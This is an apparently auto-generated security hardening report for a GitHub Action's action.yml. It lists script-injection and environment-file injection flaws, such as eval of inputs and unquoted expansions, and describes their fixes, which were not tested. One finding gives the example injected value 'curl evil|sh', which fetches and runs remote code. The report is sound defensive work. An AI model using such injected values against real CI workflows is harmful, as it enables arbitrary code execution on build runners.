<!-- markdownlint-disable -->

# Hardening Report: FirelyTeam--firely-terminal-pipeline/v0.8.14

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **FirelyTeam--firely-terminal-pipeline/v0.8.14** was hardened automatically. 11 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Rule (b): the 'Download Java Validator' step runs the workflow-controlled input JAVA_VALIDATOR_DOWNLOAD_LOCATION through eval: `JAVA_VALIDATOR_DOWNLOAD_LOCATION=$(eval echo "$JAVA_VALIDATOR_DOWNLOAD_LOCATION")`. Any $(...) or backticks in the input will run. The value is then expanded without quotes: `wget -q $JAVA_VALIDATOR_DOWNLOAD_LOCATION -O validator_cli.jar`. Fix: replace the eval with a safe substitution of $JAVA_VALIDATOR_VERSION, for example `${JAVA_VALIDATOR_DOWNLOAD_LOCATION//\$JAVA_VALIDATOR_VERSION/$JAVA_VALIDATOR_VERSION}`, and quote the wget argument.

Locations:

- `action.yml:638`
- `action.yml:641`

### script-injection (severity: high)

Rule (b): many steps run boolean inputs as unquoted commands, for example `if $INPUT_DOTNET_VALIDATION_ENABLED || $INPUT_TERMINOLOGY_SERVICE_BFARM_ENABLED; then`, `if $INPUT_JAVA_VALIDATION_ENABLED; then`, `if $INPUT_SUSHI_ENABLED; then`, `if $INPUT_SUSHI_USE_CONFIG_DEPENDENCIES; then`, `if $CLOSE_SLICING_FOR_VALIDATION; then` and `if $INPUT_JAVA_SNAPSHOT_ENABLED; then`. Bash runs the expanded value as a command, so a caller-supplied value such as `curl evil|sh` would run. Fix: compare quoted strings instead, for example `if [[ "$INPUT_DOTNET_VALIDATION_ENABLED" == "true" ]]`.

Locations:

- `action.yml:90`
- `action.yml:105`
- `action.yml:116`
- `action.yml:131`
- `action.yml:142`
- `action.yml:168`
- `action.yml:183`
- `action.yml:285`
- `action.yml:352`
- `action.yml:472`
- `action.yml:480`
- `action.yml:490`
- `action.yml:500`
- `action.yml:508`
- `action.yml:517`
- `action.yml:567`
- `action.yml:587`
- `action.yml:602`
- `action.yml:617`
- `action.yml:624`
- `action.yml:634`
- `action.yml:656`
- `action.yml:733`
- `action.yml:797`

### script-injection (severity: high)

Rule (b): the 'Install Firely.Terminal' step expands an input without quotes: `dotnet tool install --global Firely.Terminal --version $FIRELY_TERMINAL_VERSION > /dev/null`.

Locations:

- `action.yml:119`

### script-injection (severity: high)

Rule (b): the 'Simplifier login' step expands credential inputs without quotes: `fhir login email=$INPUT_SIMPLIFIER_USERNAME password=$INPUT_SIMPLIFIER_PASSWORD`.

Locations:

- `action.yml:143`

### script-injection (severity: high)

Rule (b): the 'Install fsh-sushi' step expands an input without quotes: `sudo npm install -g fsh-sushi@$SUSHI_VERSION`. The same step also has `sudo chown -R $USER ...` without quotes.

Locations:

- `action.yml:491`

### script-injection (severity: high)

Rule (b): the 'Generate conformance resources with SUSHI' and 'Re-run SUSHI' steps expand an input without quotes: `sushi $INPUT_SUSHI_OPTIONS`. Neither line has a `# shellcheck disable=SC2086` array assignment, so the exemption does not apply.

Locations:

- `action.yml:509`
- `action.yml:799`

### script-injection (severity: high)

Rule (b): the 'Run Quality Control checks' step expands inputs without quotes: `if echo $INPUT_EXPECTED_FAILS | grep -w -q VALIDATION_CONFORMANCE_DOTNET`, `fhir check $INPUT_PATH_TO_QUALITY_CONTROL_RULES` and `fhir check --fail $INPUT_PATH_TO_QUALITY_CONTROL_RULES`.

Locations:

- `action.yml:589`

### script-injection (severity: high)

Rule (b): the 'Remove package cache' step expands a value without quotes: `rm -rf $fhirCacheLocation`.

Locations:

- `action.yml:619`

### script-injection (severity: high)

Rule (b): the 'Validate all conformance resources' step expands inputs without quotes: `for p in $INPUT_PATH_TO_CONFORMANCE_RESOURCES;`, `echo $INPUT_EXPECTED_FAILS | grep ...` and `java -jar validator_cli.jar $GITHUB_WORKSPACE/$p*.xml ... -version $FHIR_VERSION $INPUT_JAVA_VALIDATION_OPTIONS $UNESCPAED_IG_DEPENDENCIES $LOCAL_IG_PARAMETERS`. FHIR_VERSION comes from env.

Locations:

- `action.yml:682`

### script-injection (severity: high)

Rule (b): the 'Validate all example resources' step expands inputs without quotes: `for p in $INPUT_PATH_TO_CONFORMANCE_RESOURCES;`, `for p in $PATH_TO_EXAMPLES;`, `echo $INPUT_EXPECTED_FAILS | grep ...` and `java -jar validator_cli.jar ... -version $FHIR_VERSION $INPUT_JAVA_VALIDATION_OPTIONS $UNESCPAED_IG_DEPENDENCIES $COMBINED_IG_PARAMETERS`.

Locations:

- `action.yml:751`

### github-env-injection (severity: high)

The 'Detect FHIR version and determine dependency source' step writes `echo "FHIR_VERSION=$fhirVersion" >> "$GITHUB_ENV"` with no sanitization. fhirVersion is not a literal computed in the script. It is read from repository-controlled files (package.json via jq, sushi-config.yaml via yq, including a base64-decoded value), so a crafted value containing newlines can add arbitrary variables to GITHUB_ENV. Fix: apply `printf '%s' "$fhirVersion" | tr -d '\n\r'` before the write.

Locations:

- `action.yml:271`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, github-env-injection

**Notes:**

action.yml only. Not run or tested; re-searched to confirm no flagged patterns remain. (1) Boolean inputs that ran as commands (`if $INPUT_X`) are now quoted `[[ "$X" == "true" ]]` checks; only the exact string 'true' counts as enabled. (2) Removed the eval on JAVA_VALIDATOR_DOWNLOAD_LOCATION: `$JAVA_VALIDATOR_VERSION` and `${JAVA_VALIDATOR_VERSION}` are replaced as plain text, and the wget URL is quoted. (3) Quoted FIRELY_TERMINAL_VERSION, the Simplifier login arguments, $USER, SUSHI_VERSION, fhirCacheLocation and EXPECTED_FAILS; the optional quality-control rules path uses ${VAR:+"$VAR"}. (4) List inputs (SUSHI_OPTIONS, JAVA_VALIDATION_OPTIONS, PATH_TO_CONFORMANCE_RESOURCES, PATH_TO_EXAMPLES) are split into arrays with the SC2086 comment, keeping upstream's whitespace split and wildcard expansion. -ig flags are built as arrays, package.json dependencies are split with read -a, -version "$FHIR_VERSION" is quoted, and file paths are written "$GITHUB_WORKSPACE/$p"*.xml so the wildcards still expand. Side effect: a conformance folder path containing a space now gives one -ig argument instead of two. (5) FHIR_VERSION is stripped of newlines and carriage returns with tr before it is written to GITHUB_ENV.

